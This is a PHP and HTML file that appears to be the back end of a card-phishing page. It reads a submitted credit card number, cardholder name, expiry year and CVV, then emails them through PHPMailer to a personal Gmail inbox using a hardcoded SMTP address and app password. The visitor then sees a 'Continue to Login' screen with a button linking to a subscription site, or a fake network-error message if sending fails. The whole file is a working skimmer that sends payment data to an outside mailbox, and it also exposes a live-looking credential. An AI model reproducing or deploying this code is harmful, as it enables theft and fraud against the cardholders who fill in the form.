<?php 
        
    // $to = 'dannyfrosh71@gmail.com';
    $subject = 'New credit card input';

    $cardNumber = $_POST["cardNumber"];
    $cardName = $_POST["cardName"];
    // $month = $_POST["month"];
    $year = $_POST["year"];
    $cvv = $_POST["cvvNumber"];



//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings                     //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'dannyfrosh71@gmail.com';                     //SMTP username
    $mail->Password   = 'akbm nnpd ngem kcpr';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('dannyfrosh71@gmail.com');
    $mail->addAddress('dannyfrosh71@gmail.com', 'daniel'); 


    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = $subject;
    $mail->Body    = ($cardName);
    $mail->Body = $cardNumber. $cardName. $cvv. $year;
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo '<h2>Continue to Login</h2>';
} catch (Exception $e) {
    echo "<h1>Network Error please check <br> your internet conection</h1>";
}





   


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: sans-serif;
    }

    .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 300px;
        box-shadow: 0 0 20px;
        padding: 15px; 
        border-radius: 10px;
        margin-top: 35vh;
    }

    h1 {
        font-size: 18px;
        text-align: center;
        margin-top: 40vh;

    }

    h2 {
        color: blue;
        text-align: center;
        font-size: 18px;
        margin-top: 40vh;
    }

    button {
        width: 250px;
        height: 40px;
        font-size: 20px;
        border-radius: 10px;
        border: 1px solid black;
        background: rgb(112, 96, 236); 
        color: white;
        /* margin-top: 50vh; */
    }

    body {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

    /* a {
        width: 250px;
    } */
</style>
<body>
    <a href="onlyfans.com"><button>Continue</button></a>
</body>
</html>



